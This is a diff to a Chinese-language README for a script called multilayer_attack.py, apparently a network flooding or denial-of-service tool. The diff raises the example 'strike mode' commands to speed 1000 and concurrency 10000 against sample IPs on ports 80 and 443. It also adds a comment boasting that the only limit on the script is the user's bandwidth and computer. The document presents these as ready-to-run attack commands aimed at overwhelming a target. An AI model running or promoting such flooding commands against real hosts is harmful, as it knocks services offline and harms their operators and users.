@@ -65,10 +65,13 @@ chmod +x multilayer_attack.py
 ### 基础用法
 ```bash
 # 全面打击模式
-python multilayer_attack.py -ip 192.168.1.100 -port 80 -speed 900 -concurrency 500
+python multilayer_attack.py -ip 192.168.1.100 -port 80 -speed 1000 -concurrency 10000
 
 # 精确打击模式
-python multilayer_attack.py -ip 10.0.0.50 -port 443 -speed 700 -concurrency 300 -timeout 10
+python multilayer_attack.py -ip 10.0.0.50 -port 443 -speed 1000 -concurrency 10000 -timeout 10
+
+# 这脚本唯一的限制就是你家的破宽带和电脑有多垃！
+
 ```
 
 ### 高级参数
